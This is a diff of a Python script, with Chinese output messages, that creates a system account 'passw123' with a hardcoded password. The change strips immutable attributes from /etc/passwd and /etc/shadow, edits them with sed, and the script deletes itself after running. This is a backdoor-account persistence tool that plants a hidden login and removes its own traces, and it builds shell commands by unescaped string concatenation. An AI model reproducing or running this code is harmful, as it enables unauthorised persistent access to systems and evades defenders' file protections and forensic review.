@@ -2,6 +2,7 @@
 from __future__ import print_function
 import subprocess
 import sys,os
+import requests
 
 def ml(command):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -33,6 +34,17 @@ def adduser(user, password):
     else:
         print("----------------------->失败<-----------------------")
 
+def deluser(user):
+    try:
+        ml('chattr -i /etc/passwd')
+        ml('chattr -i /etc/shadow')
+        command = "sed -i '/^" + user + ":/d' /etc/shadow"
+        ml(command)
+        command = "sed -i '/^" + user + ":/d' /etc/passwd"
+        ml(command)
+    except Exception as e:
+        pass
+
 def delete_current_script():
     try:
         script_path = os.path.abspath(sys.argv[0])
@@ -41,16 +53,9 @@ def delete_current_script():
     except Exception as e:
         print("无法删除当前脚本文件：", e)
 
-def deluser(user):
-    command = "sed -i '/^" + user + ":/d' /etc/shadow"
-    ml(command)
-    command = "sed -i '/^" + user + ":/d' /etc/passwd"
-    ml(command)
-
-
 if __name__ == '__main__':
     user = 'passw123'
     password = 'admin@#45123'
+    deluser(user)  # 删除用户
     adduser(user, password)
-    # deluser(user)  #删除用户
     delete_current_script()  # 删除当前执行脚本文件
